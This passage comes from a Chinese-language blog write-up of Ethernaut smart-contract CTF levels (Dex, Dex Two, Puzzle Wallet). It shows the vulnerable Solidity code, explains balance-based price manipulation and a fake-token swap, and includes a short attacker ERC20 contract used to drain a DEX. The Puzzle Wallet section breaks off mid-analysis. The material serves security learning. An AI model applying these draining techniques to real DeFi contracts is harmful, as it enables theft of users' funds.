<h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 Dex"></a>22 Dex</h2><h3 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(</span><br><span class="line">            (from == token1 &amp;&amp; to == token2) ||</span><br><span class="line">                (from == token2 &amp;&amp; to == token1),</span><br><span class="line">            &quot;Invalid tokens&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            IERC20(from).balanceOf(msg.sender) &gt;= amount,</span><br><span class="line">            &quot;Not enough to swap&quot;</span><br><span class="line">        );</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) /</span><br><span class="line">            IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address dexInstance,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>The goal of this level is for you to hack the basic <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Decentralized_exchange" >DEX <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> contract below and steal the funds by price manipulation.</p>
<p>You will start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract starts with 100 of each token.</p>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
<p><strong>Quick note</strong></p>
<p>Normally, when you make a swap with an ERC20 token, you have to <code>approve</code> the contract to spend your tokens for you. To keep with the syntax of the game, we’ve just added the <code>approve</code> method to the contract itself. So feel free to use <code>contract.approve(contract.address, &lt;uint amount&gt;)</code> instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the <code>SwappableToken</code> contract otherwise.</p>
<p> Things that might help:</p>
<ul>
<li>How is the price of the token calculated?</li>
<li>How does the <code>swap</code> method work?</li>
<li>How do you <code>approve</code> a transaction of an ERC20?</li>
<li>Theres more than one way to interact with a contract!</li>
<li>Remix might help</li>
<li>What does “At Address” do?</li>
</ul>
<h3 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h3><p>关卡要求掏空交易所里两种代币的其中的至少一种，看到汇率的计算方式，决定从这里入手：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数的大概意思是将交易所拥有的两种代币的比值当作汇率，问题就出在这里。使用余额作为计算价格的因素，会导致价格可控，被恶意利用。</p>
<p>假设一下，我们把手上的 token2 都换成 token1，这时我们有 20 个 token1，交易所有 90 个 token1，110 个 token2。那么我们把这 20 个 token1 又换成token2，重复几遍，就会发生奇妙的事情：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">swapAmount = 20 * 110 / 90 = 24.44444 ≈ 24</span><br><span class="line">           = 24 * 110 / 86 = 30.69767 ≈ 30</span><br><span class="line">           = 30 * 110 / 80 = 41.25000 ≈ 41</span><br></pre></td></tr></table></figure></div>

<p>那么继续下去就能掏空一种代币了。</p>
<h3 id="Exploit-8"><a href="#Exploit-8" class="headerlink" title="Exploit"></a>Exploit</h3><p>有点像滚烫开水的降温法术（就是用两个杯子来回倒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070106661.png"
                      alt="image-20240307010605583"
                ></p>
<p>成功掏空了 token1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070112218.png"
                      alt="image-20240307011212159"
                ></p>
<h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23 Dex Two"></a>23 Dex Two</h2><h3 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add_liquidity(address token_address, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(</span><br><span class="line">            IERC20(from).balanceOf(msg.sender) &gt;= amount,</span><br><span class="line">            &quot;Not enough to swap&quot;</span><br><span class="line">        );</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapAmount(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) /</span><br><span class="line">            IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address dexInstance,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h3><p>This level will ask you to break <code>DexTwo</code>, a subtlely modified <code>Dex</code> contract from the previous level, in a different way.</p>
<p>You need to drain all balances of token1 and token2 from the <code>DexTwo</code> contract to succeed in this level.</p>
<p>You will still start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract still starts with 100 of each token.</p>
<p> Things that might help:</p>
<ul>
<li>How has the <code>swap</code> method been modified?</li>
</ul>
<h3 id="Analysis-10"><a href="#Analysis-10" class="headerlink" title="Analysis"></a>Analysis</h3><p>这一关要求掏空交易所拥有的两种代币，与上一关相比，修改了 swap 函数，使其跳过了验证代币的步骤。如此，我们可以自己部署代币合约，以操纵价格。</p>
<p>部署一个 ERC20 代币合约，用它把 token1 和 token2 换出就好：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BeeCoin is ERC20 &#123;</span><br><span class="line">    address public dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _dex,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        dex = _dex;</span><br><span class="line">        _mint(dex, 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403091449397.png"
                      alt="image-20240309144919308"
                ></p>
<h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24 Puzzle Wallet"></a>24 Puzzle Wallet</h2><h3 id="Code-11"><a href="#Code-11" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h3><p>Nowadays, paying for DeFi operations is impossible, fact.</p>
<p>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.</p>
<p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.</p>
<p>Little did they know, their lunch money was at risk…</p>
<p> You’ll need to hijack this wallet to become the admin of the proxy.</p>
<p> Things that might help:</p>
<ul>
<li>Understanding how <code>delegatecall</code> works and how <code>msg.sender</code> and <code>msg.value</code> behaves when performing one.</li>
<li>Knowing about proxy patterns and the way they handle storage variables.</li>
</ul>
<h3 id="Analysis-11"><a href="#Analysis-11" class="headerlink" title="Analysis"></a>Analysis</h3><p>这一关的重点在于代理合约、可升级合约的概念，以及对<code>delegatecall</code>性质的理解。</p>
<p>简单来说，PuzzleWallet 合约中的 multicall 函数使用了 delegatecall，这会导致委托调用其他合约的函数时，自身的存储被修改。正好在 PuzzleProxy </p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Ethernaut WP _持续更新中。。。</li>
        <li><strong>Author:</strong> f4tb3e</li>
        <li><strong>Created at
                :</strong> 2023-10-07 12:00:00</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-03-15 11:34:00
            </li>
        
        <li>
            <strong>Link:</strong> https://f4tb3e.github.io/2023/10/07/Ethernaut-wp/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/solidity/">#solidity</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2023/11/07/Foundry%E4%BD%BF%E7%94%A8/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Foundry 工具的使用笔记</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2023/10/05/%E5%9F%BA%E7%A1%80%E5%A4%87%E5%BF%98/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">区块链安全基础备忘</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Ethernaut WP _持续更新中。。。</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#00-Hello-Ethernaut"><span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-Fallback"><span class="nav-text">01 Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-Fal1out"><span class="nav-text">02 Fal1out</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-Coin-Flip"><span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-Telephone"><span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-Token"><span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-Delegation"><span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07-Force"><span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08-Vault"><span class="nav-text">08 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09-King"><span class="nav-text">09 King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Re-entrancy"><span class="nav-text">10 Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Elevator"><span class="nav-text">11 Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Privacy"><span class="nav-text">12 Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Gatekeeper-One"><span class="nav-text">13 Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-Gatekeeper-Two"><span 